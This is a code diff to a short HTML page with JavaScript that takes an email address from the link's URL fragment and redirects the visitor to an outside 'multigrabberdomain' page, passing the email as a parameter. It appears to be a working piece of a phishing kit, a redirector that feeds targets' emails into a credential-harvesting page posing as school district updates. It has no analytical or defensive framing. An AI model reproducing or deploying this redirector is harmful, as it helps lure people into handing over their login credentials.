@@ -1,21 +1,37 @@
-<script>
-(function () {
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Redirect Test</title>
 
-    // Get everything after #
+<script>
+window.addEventListener("load", function () {
+
+    console.log("Script loaded");
+    console.log("Current hash:", window.location.hash);
+
     var hashValue = window.location.hash;
 
     if (hashValue && hashValue.length > 1) {
 
-        // Remove the #
         var email = hashValue.substring(1);
+        console.log("Extracted value:", email);
 
-        // Build final URL
-        var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well=" 
+        var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well="
                         + encodeURIComponent(email);
 
-        // Redirect cleanly (no #)
-        window.location.replace(finalUrl);
+        console.log("Redirecting to:", finalUrl);
+
+        window.location.href = finalUrl;
+    } else {
+        console.log("No hash found. No redirect.");
     }
 
-})();
+});
 </script>
+
+</head>
+<body>
+Redirecting...
+</body>
+</html>
